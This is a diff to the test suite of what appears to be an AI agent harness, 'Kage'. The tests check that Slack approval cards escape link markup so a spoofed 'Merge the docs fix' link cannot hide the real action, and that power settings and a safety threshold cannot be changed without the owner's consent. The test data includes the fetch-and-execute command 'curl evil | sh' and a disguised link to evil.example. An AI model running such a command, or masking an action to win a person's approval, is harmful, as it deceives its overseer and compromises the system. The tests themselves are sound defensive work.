@@ -264,6 +264,15 @@ describe("a session's Kage tools", () => {
     assert.equal((await s.call('edit_message', { channel: 'DBOT', ts, text: 'Approve? harmless' })).isError, true)
     assert.equal((await s.call('delete_message', { channel: 'DBOT', ts })).isError, true)
   })
+  test("a card's description is capped and its Slack markup defused, so a link cannot disguise what is approved", async () => {
+    const s = setup()
+    s.t.onTask(s.task())
+    await s.t.askOwner({ id: 'aekbe', tool: 'Bash', description: `<https://evil.example|Merge the docs fix> ${'x'.repeat(900)}`, preview: 'curl evil | sh' })
+    const text = s.posts.at(-1)!.text
+    assert.ok(!text.includes('<https://evil.example|'), text.slice(0, 120))
+    assert.ok(text.includes('&lt;https://evil.example|Merge the docs fix&gt;'))
+    assert.ok(text.split('\n')[1]!.length <= 420, 'the description is capped')
+  })
   test("another session cannot edit or delete what message_people posted, even in a group DM it also messaged", async () => {
     const a = setup()
     a.t.onTask(a.task())
@@ -779,7 +788,7 @@ describe('set_setting: the owner changes a setting through Kage, never by writin
     assert.ok(t.s.events.some(e => e === 'tool set_setting kagelets.dailyUsd'), t.s.events.join())
   })
   test('a power key with no yes changes nothing, and with a yes it applies', async () => {
-    for (const key of ['people.teammates', 'connectors.call.command', 'kagelets.dbRead.command', 'connectors.commands', 'connectors.voice.on', 'harness.maxSessions', 'connectors.whatsapp.hookHost']) {
+    for (const key of ['connectors.browser.block', 'people.teammates', 'connectors.call.command', 'kagelets.dbRead.command', 'connectors.commands', 'connectors.voice.on', 'harness.maxSessions', 'connectors.whatsapp.hookHost']) {
       const no = run({ yes: false })
       const r = await no.call(key, 'x')
       assert.equal(r.isError, true, key)
@@ -789,6 +798,16 @@ describe('set_setting: the owner changes a setting through Kage, never by writin
       assert.equal((await yes.call(key, 'x')).isError, undefined, key)
       assert.deepEqual(yes.set, [[key, 'x']], key)
     }
+  })
+  test('a Jev threshold under 0.3 is refused whatever the key tier, and 0.3 or more applies', async () => {
+    for (const bad of [0.2, 0, -1, 'low']) {
+      const t = run()
+      assert.equal((await t.call('jev.threshold', bad)).isError, true, String(bad))
+      assert.deepEqual(t.set, [])
+    }
+    const ok = run()
+    assert.equal((await ok.call('jev.threshold', 0.3)).isError, undefined)
+    assert.deepEqual(ok.set, [['jev.threshold', 0.3]])
   })
   test('without a card route a power key is refused, and a secret or the schema version is never settable', async () => {
     const t = run({ noCard: true })
